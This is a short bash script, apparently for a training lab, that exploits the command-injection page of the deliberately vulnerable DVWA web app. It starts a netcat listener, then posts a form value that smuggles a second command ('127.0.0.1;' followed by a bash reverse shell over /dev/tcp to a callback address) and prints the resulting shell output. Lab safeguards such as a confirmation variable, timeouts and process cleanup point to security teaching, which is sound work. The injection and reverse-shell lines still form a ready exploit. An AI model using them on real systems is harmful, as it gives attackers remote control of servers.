#!/usr/bin/env bash
set -euo pipefail
: "${LAB_CONFIRM:?Set LAB_CONFIRM=NT204-LAB}"
[[ "$LAB_CONFIRM" == NT204-LAB ]] || { echo 'Wrong lab confirmation' >&2; exit 1; }
: "${DVWA_COOKIE:?Set DVWA_COOKIE to a temporary authenticated cookie file}"
WEB_IP="${WEB_IP:-10.10.20.10}"
CALLBACK_IP="${CALLBACK_IP:-10.10.10.11}"
PORT="${PORT:-4444}"
test -r "$DVWA_COOKIE" || { echo 'Cookie file is not readable' >&2; exit 1; }
LOG="$(mktemp)"
trap 'unlink "$LOG" 2>/dev/null || true' EXIT
(printf 'id\nexit\n' | timeout 15 nc -lvkp "$PORT" >"$LOG" 2>&1) &
listener_pid=$!
sleep 2
(timeout 8 curl --max-time 6 -fsS -b "$DVWA_COOKIE" \
  --data-urlencode "ip=127.0.0.1;/bin/bash -c 'bash -i >& /dev/tcp/${CALLBACK_IP}/${PORT} 0>&1'" \
  --data-urlencode 'Submit=Submit' \
  "http://${WEB_IP}/DVWA/vulnerabilities/exec/" >/dev/null) || true
wait "$listener_pid" || true
cat "$LOG"
! pgrep -af 'nc.*4444|bash -i' >/dev/null || { echo 'Test process remains' >&2; exit 1; }
